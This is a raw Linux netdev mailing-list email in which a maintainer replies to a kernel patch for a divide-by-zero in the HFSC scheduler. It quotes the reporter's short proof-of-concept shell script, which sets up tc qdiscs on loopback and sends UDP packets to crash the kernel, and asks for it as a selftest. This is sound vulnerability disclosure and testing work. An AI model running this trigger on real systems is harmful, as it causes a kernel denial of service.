Return-Path: <netdev+bounces-272213-lists+netdev=lfdr.de@vger.kernel.org>
Delivered-To: lists+netdev@lfdr.de
Received: from mail.lfdr.de
	by lfdr with LMTP
	id MKzWAVCHxWlc+wQAu9opvQ
	(envelope-from <netdev+bounces-272213-lists+netdev=lfdr.de@vger.kernel.org>)
	for <lists+netdev@lfdr.de>; Thu, 26 Mar 2026 20:21:52 +0100
X-Original-To: lists+netdev@lfdr.de
Received: from sto.lore.kernel.org (sto.lore.kernel.org [IPv6:2600:3c09:e001:a7::12fc:5321])
	by mail.lfdr.de (Postfix) with ESMTPS id 91BDA33AE06
	for <lists+netdev@lfdr.de>; Thu, 26 Mar 2026 20:21:51 +0100 (CET)
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by sto.lore.kernel.org (Postfix) with ESMTP id 5F61730439C8
	for <lists+netdev@lfdr.de>; Thu, 26 Mar 2026 19:21:44 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id F3B7B34F48E;
	Thu, 26 Mar 2026 19:21:38 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b="tJN17evF"
X-Original-To: netdev@vger.kernel.org
Received: from smtp.kernel.org (aws-us-west-2-korg-mail-1.web.codeaurora.org [10.30.226.201])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id D0F9E33438F
	for <netdev@vger.kernel.org>; Thu, 26 Mar 2026 19:21:38 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=10.30.226.201
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1774552898; cv=none; b=SxbQBwW2+Bl2tcVfgcofUhRKDAHkllfBnPPCfj1b/vXvhukPQ7Rz9tHOPkuBmY/zCfFs24MbKXH/gYZU+GLBph1KovuVMg1r9M1I9AqS9PwfXvFbJ7ELQWLI2OlLtPJh9Fi7zEAr3OrqY+A+FFcs99kiR/giHIjjdaDrVib77ck=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1774552898; c=relaxed/simple;
	bh=n8NwTJap2e6KFV5E5E3Hn/+5llcKB3aHX9nN3AO/TuU=;
	h=Date:From:To:Cc:Subject:Message-ID:In-Reply-To:References:
	 MIME-Version:Content-Type; b=A/LERHU7JnSfim0DCPwj4uGYvsGbfr1tH0qoDYAv1OIHMyeg7kH3trBoZsNoeTyK386nv2q8EiwUDbGzz0G1/4UPettzxyaVieKNYEo5XPIGvgui9oqu+NXTG04otr3wnWIBDDDbbL7NX3tKw5Crz9BuHnl19H8rImearVGiHFw=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b=tJN17evF; arc=none smtp.client-ip=10.30.226.201
Received: by smtp.kernel.org (Postfix) with ESMTPSA id 4446CC116C6;
	Thu, 26 Mar 2026 19:21:38 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=kernel.org;
	s=k20201202; t=1774552898;
	bh=n8NwTJap2e6KFV5E5E3Hn/+5llcKB3aHX9nN3AO/TuU=;
	h=Date:From:To:Cc:Subject:In-Reply-To:References:From;
	b=tJN17evFHRqyhMWaMxkw+ua8S+V1+xw1z1vSC/162yoObbUzp7Ers6dHiaZzGtTVI
	 mfvyP7CMVcq7e9EE7kZ8p6MFaQkhR6dL+vSOLQ+/GrKdTh+MH9rNj2a53Nlyj/2DRJ
	 RBLKRdzSvG7Xp2/AADqIBOEn/IMk+6gWsyznPfJArbAeiwq1dqZbkWcyUFlt0Yv9xe
	 bfC3Cj7vF9P9hr4gD41WryFFwnXEY0kq0CR5GvA2ReWr9DWyzjCdgANtTOFZ+II7I8
	 Zy09EUylHauxG1o4FSVaSxy64Az3yf1c8Pi6qaUWNus7cE941/6F8P6JV5tmPIoexU
	 o2fVJAfL2rY0w==
Date: Thu, 26 Mar 2026 12:21:37 -0700
From: Jakub Kicinski <kuba@kernel.org>
To: Xiang Mei <xmei5@asu.edu>
Cc: security@kernel.org, netdev@vger.kernel.org, pabeni@redhat.com,
 jhs@mojatatu.com, jiri@resnulli.us, davem@davemloft.net,
 edumazet@google.com, horms@kernel.org, bestswngs@gmail.com
Subject: Re: [PATCH net v2] net/sched: sch_hfsc: fix divide-by-zero in
 rtsc_min()
Message-ID: <20260326122137.4aae1d46@kernel.org>
In-Reply-To: <g5kyhh74rriqg4ayz5txfqqtxpuklzu4kbkmcwihqpvyv4xq2s@xcpvtqh7bh5g>
References: <20260326075851.3967598-1-xmei5@asu.edu>
	<g5kyhh74rriqg4ayz5txfqqtxpuklzu4kbkmcwihqpvyv4xq2s@xcpvtqh7bh5g>
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: quoted-printable
X-Spamd-Result: default: False [-2.16 / 15.00];
	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=1];
	DMARC_POLICY_ALLOW(-0.50)[kernel.org,quarantine];
	R_SPF_ALLOW(-0.20)[+ip6:2600:3c09:e001:a7::/64:c];
	R_DKIM_ALLOW(-0.20)[kernel.org:s=k20201202];
	MAILLIST(-0.15)[generic];
	MIME_GOOD(-0.10)[text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	DKIM_TRACE(0.00)[kernel.org:+];
	FREEMAIL_CC(0.00)[kernel.org,vger.kernel.org,redhat.com,mojatatu.com,resnulli.us,davemloft.net,google.com,gmail.com];
	RCVD_TLS_LAST(0.00)[];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	TAGGED_FROM(0.00)[bounces-272213-lists,netdev=lfdr.de];
	FORGED_SENDER_MAILLIST(0.00)[];
	RCVD_COUNT_THREE(0.00)[4];
	MISSING_XM_UA(0.00)[];
	FROM_HAS_DN(0.00)[];
	MIME_TRACE(0.00)[0:+];
	NEURAL_HAM(-0.00)[-1.000];
	PRECEDENCE_BULK(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[kuba@kernel.org,netdev@vger.kernel.org];
	ASN(0.00)[asn:63949, ipnet:2600:3c09::/32, country:SG];
	MID_RHS_MATCH_FROM(0.00)[];
	TAGGED_RCPT(0.00)[netdev];
	RCPT_COUNT_SEVEN(0.00)[10];
	RCVD_VIA_SMTP_AUTH(0.00)[];
	TO_DN_SOME(0.00)[]
X-Rspamd-Queue-Id: 91BDA33AE06
X-Rspamd-Action: no action
X-Rspamd-Server: lfdr

On Thu, 26 Mar 2026 11:54:52 -0700 Xiang Mei wrote:
> PoC:
> ```sh
> #!/bin/sh
> ip link set lo up
>=20
> tc qdisc replace dev lo root handle 1: \
>     stab overhead 3000000 mtu 0 tsize 0 \
>     hfsc default 1
> tc class replace dev lo parent 1: classid 1:1 hfsc \
>     rt m1 32gbit d 1ms m2 0bit \
>     ls m1 32gbit d 1ms m2 0bit
>=20
> # Send UDP to loopback (same method as C PoC)
> python3 -c "
> import socket,time
> s=3Dsocket.socket(socket.AF_INET,socket.SOCK_DGRAM)
> s.sendto(b'A'*64,('127.0.0.1',1337))  # activate class
> time.sleep(1)                           # drain =E2=86=92 idle
> s.sendto(b'A'*64,('127.0.0.1',1337))  # reactivation =E2=86=92 div-by-zero
> "
> ```

Please turn this into a TDC selftest.

